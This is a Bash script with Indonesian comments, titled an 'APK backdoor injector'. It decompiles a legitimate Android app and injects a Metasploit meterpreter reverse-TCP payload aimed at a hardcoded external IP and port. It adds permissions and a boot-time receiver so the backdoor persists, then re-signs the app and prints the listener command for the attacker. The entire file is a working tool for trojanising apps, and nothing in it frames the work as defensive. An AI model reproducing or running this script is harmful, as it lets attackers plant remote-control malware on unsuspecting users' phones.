#!/bin/bash

# =============================================
# APK BACKDOOR INJECTOR - ULTIMATE VERSION
# =============================================

# --- KONFIGURASI ---
APK_INPUT="${1:-original.apk}"
LHOST="8.215.192.205"
LPORT="4444"
WORKDIR=$(mktemp -d -p "$(pwd)" apk_work_XXXXXX)
TOOL_DIR="$HOME/.apk_tools"
LOG_FILE="apk_mod_$(date +%Y%m%d_%H%M%S).log"
KEYSTORE="$TOOL_DIR/debug.keystore"
APK_OUTPUT="${APK_INPUT%.*}_mod.apk"

# --- FUNGSI UTAMA ---

install_dependencies() {
    echo "[*] Memeriksa dependensi..." | tee -a "$LOG_FILE"
    
    # Install paket dasar
    sudo apt update && sudo apt install -y \
        apktool \
        zipalign \
        openjdk-11-jdk \
        android-sdk-build-tools \
        metasploit-framework \
        2>> "$LOG_FILE"
    
    # Setup Android SDK
    if ! command -v aapt2 &>/dev/null; then
        echo "[*] Menginstall aapt2..." | tee -a "$LOG_FILE"
        sudo apt install -y aapt2 android-sdk 2>> "$LOG_FILE" || {
            echo "[!] Gagal install aapt2, mencoba metode alternatif..." | tee -a "$LOG_FILE"
            wget https://dl.google.com/android/repository/build-tools_r34-linux.zip -O "$TOOL_DIR/aapt2.zip" && \
            unzip "$TOOL_DIR/aapt2.zip" -d "$TOOL_DIR" 2>> "$LOG_FILE"
            export PATH="$PATH:$TOOL_DIR/android-sdk/build-tools/34.0.0"
        }
    fi
}

setup_environment() {
    echo "[*] Menyiapkan environment..." | tee -a "$LOG_FILE"
    mkdir -p "$TOOL_DIR"
    
    # Buat keystore jika belum ada
    if [ ! -f "$KEYSTORE" ]; then
        keytool -genkey -v -keystore "$KEYSTORE" \
        -alias androiddebugkey -storepass android -keypass android \
        -keyalg RSA -keysize 4096 -validity 10000 \
        -dname "CN=Android Debug,O=Android,C=US" 2>> "$LOG_FILE" || {
            echo "[X] Gagal membuat keystore" | tee -a "$LOG_FILE"
            exit 1
        }
    fi
}

decompile_apk() {
    echo "[*] Memproses APK..." | tee -a "$LOG_FILE"
    
    # 1. Hapus signature lama
    echo "[1/5] Menghapus signature lama..." | tee -a "$LOG_FILE"
    zip -d "$APK_INPUT" 'META-INF/*' 2>> "$LOG_FILE"
    
    # 2. Dekompilasi
    echo "[2/5] Mendekompilasi APK..." | tee -a "$LOG_FILE"
    apktool d -r -s -f "$APK_INPUT" -o "$WORKDIR/original" 2>> "$LOG_FILE" || {
        echo "[!] Gagal dekompilasi, mencoba tanpa resource..." | tee -a "$LOG_FILE"
        apktool d -s -f "$APK_INPUT" -o "$WORKDIR/original" 2>> "$LOG_FILE" || {
            echo "[X] Gagal total dekompilasi" | tee -a "$LOG_FILE"
            exit 1
        }
    }
}

inject_payload() {
    echo "[3/5] Menyuntikkan payload..." | tee -a "$LOG_FILE"
    
    # 1. Buat payload
    msfvenom -p android/meterpreter/reverse_tcp \
    LHOST="$LHOST" LPORT="$LPORT" \
    -o "$WORKDIR/payload.apk" 2>> "$LOG_FILE" || {
        echo "[X] Gagal membuat payload" | tee -a "$LOG_FILE"
        exit 1
    }
    
    # 2. Ekstrak payload
    apktool d -f "$WORKDIR/payload.apk" -o "$WORKDIR/payload" 2>> "$LOG_FILE"
    
    # 3. Inject smali
    mkdir -p "$WORKDIR/original/smali/com"
    cp -r "$WORKDIR/payload/smali/com/metasploit" "$WORKDIR/original/smali/com/" 2>> "$LOG_FILE"
    
    # 4. Modifikasi Manifest
    MANIFEST="$WORKDIR/original/AndroidManifest.xml"
    sed -i '/<application/i \
    <uses-permission android:name="android.permission.INTERNET"/> \
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/> \
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>' "$MANIFEST"
    
    sed -i '/<\/application>/i \
    <service android:name="com.metasploit.stage.PayloadService" \
        android:exported="false" \
        android:permission="android.permission.BIND_JOB_SERVICE"/> \
    <receiver android:name="com.metasploit.stage.PayloadReceiver" \
        android:exported="false"> \
        <intent-filter> \
            <action android:name="android.intent.action.BOOT_COMPLETED"/> \
        </intent-filter> \
    </receiver>' "$MANIFEST"
    
    # 5. Update versi SDK
    sed -i \
    -e 's/minSdkVersion: .*/minSdkVersion: 21/' \
    -e 's/targetSdkVersion: .*/targetSdkVersion: 31/' \
    "$WORKDIR/original/apktool.yml"
}

build_apk() {
    echo "[4/5] Membangun APK baru..." | tee -a "$LOG_FILE"
    
    # 1. Rebuild dengan optimasi
    apktool b --use-aapt2 --no-crunch "$WORKDIR/original" -o "$WORKDIR/unsigned.apk" 2>> "$LOG_FILE" || {
        echo "[!] Gagal build dengan aapt2, mencoba metode biasa..." | tee -a "$LOG_FILE"
        apktool b "$WORKDIR/original" -o "$WORKDIR/unsigned.apk" 2>> "$LOG_FILE" || {
            echo "[X] Gagal total membangun APK" | tee -a "$LOG_FILE"
            exit 1
        }
    }
    
    # 2. Zipalign
    echo "[5/5] Menandatangani APK..." | tee -a "$LOG_FILE"
    zipalign -v 4 "$WORKDIR/unsigned.apk" "$WORKDIR/aligned.apk" 2>> "$LOG_FILE"
    
    # 3. Signing modern
    apksigner sign \
    --ks "$KEYSTORE" \
    --ks-key-alias androiddebugkey \
    --ks-pass pass:android \
    --key-pass pass:android \
    --out "$APK_OUTPUT" \
    "$WORKDIR/aligned.apk" 2>> "$LOG_FILE" || {
        echo "[!] Gagal dengan apksigner, mencoba jarsigner..." | tee -a "$LOG_FILE"
        jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
        -keystore "$KEYSTORE" \
        -storepass android \
        -keypass android \
        "$WORKDIR/aligned.apk" androiddebugkey 2>> "$LOG_FILE" || {
            echo "[X] Gagal menandatangani APK" | tee -a "$LOG_FILE"
            exit 1
        }
        mv "$WORKDIR/aligned.apk" "$APK_OUTPUT"
    }
}

# --- EKSEKUSI UTAMA ---
cleanup() {
    echo "[*] Membersihkan temporary files..." | tee -a "$LOG_FILE"
    rm -rf "$WORKDIR"
}

trap cleanup EXIT

echo "=== APK INJECTOR ===" | tee -a "$LOG_FILE"
echo "[*] Target: $APK_INPUT" | tee -a "$LOG_FILE"
echo "[*] LHOST: $LHOST" | tee -a "$LOG_FILE"
echo "[*] LPORT: $LPORT" | tee -a "$LOG_FILE"

install_dependencies
setup_environment
decompile_apk
inject_payload
build_apk

echo "[√] Berhasil! APK termodifikasi: $APK_OUTPUT" | tee -a "$LOG_FILE"
echo "[*] Listener command:" | tee -a "$LOG_FILE"
echo "msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; run'" | tee -a "$LOG_FILE"
echo "[!] Catatan: Aplikasi mungkin perlu diinstal dengan --bypass-low-target-sdk" | tee -a "$LOG_FILE"
